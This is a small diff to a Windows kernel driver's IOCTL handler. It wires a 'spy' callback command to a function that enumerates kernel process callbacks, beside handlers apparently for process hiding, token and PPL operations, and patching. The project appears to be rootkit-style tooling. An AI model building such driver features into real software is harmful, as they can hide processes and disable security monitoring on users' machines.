@@ -2,7 +2,7 @@
 #include "driverops.h"
 #include "tokenops.h"
 #include "pplops.h"
-
+#include "callbackops.h"
 // ---------------------------------------------------------------
 // main driver routines
 // ---------------------------------------------------------------
@@ -185,6 +185,7 @@ NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
         break;
 	}
 
+
     case IOCTL_SPY_PHIDE:
     {
         DbgPrint("[*] IOCTL_SPY_PHIDE received\n");
@@ -251,7 +252,16 @@ NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 
     case IOCTL_SPY_CALLBACK:
         DbgPrint("[*] IOCTL_SPY_CALLBACK received\n");
-        // TODO: Implement
+        if (outBufferLength < 1024) {
+            DbgPrint("[-] Output buffer too small\n");
+            status = STATUS_BUFFER_TOO_SMALL;
+            break;
+        }
+        status = SpyIoEnumerateProcessCallbacks(
+            buffer,
+            outBufferLength,
+            &bytesReturned
+        );
         break;
 
     case IOCTL_SPY_PATCH:
